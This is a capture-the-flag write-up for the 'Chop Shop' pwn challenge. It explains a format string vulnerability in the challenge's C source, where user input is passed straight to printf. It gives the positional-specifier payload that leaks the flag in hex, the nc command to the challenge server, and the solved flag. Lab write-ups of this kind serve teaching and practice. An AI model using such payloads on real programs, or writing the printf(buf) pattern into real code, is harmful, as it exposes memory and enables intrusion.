# CHOP SHOP
# Pwn(easy)

## What I noticed

I checked the source code and found that the flag was copied into five 8-byte variables: `c1`, `c2`, `c3`, `c4`, and `c5`.

```c
memcpy(&c1, flag, 8);
memcpy(&c2, flag + 8, 8);
memcpy(&c3, flag + 16, 8);
memcpy(&c4, flag + 24, 8);
memcpy(&c5, flag + 32, 8);

fgets(buf, sizeof(buf), stdin);
printf(buf, c1, c2, c3, c4, c5);
```

The problem is `printf(buf, ...)`. Since my input is used as the format string, I can enter format specifiers to print the values passed to `printf`. This is a format string vulnerability.

## Getting the flag

I used positional format specifiers to print each of the five values as a 16-digit hexadecimal number:

```text
%1$016lx%2$016lx%3$016lx%4$016lx%5$016lx
```

Each specifier prints one 8-byte chunk. I connected to the challenge server and entered the payload when it prompted me:

```bash
nc 3.111.53.245 1337
```

```text
Lets Chop:
%1$016lx%2$016lx%3$016lx%4$016lx%5$016lx
```

The output was the flag’s five chunks in hexadecimal. I converted the hex back to bytes and reversed the byte order within each chunk because the values were stored in little-endian order. Joining the chunks revealed the flag.

## Commands

```bash
cat chop_shop.c
file chop_shop
chmod +x chop_shop
./chop_shop
nc 3.111.53.245 1337
```

## Flag

```text
bi0s{ch0pp3d_1nt0_r3g1st3rs_n0t_st4ck}
```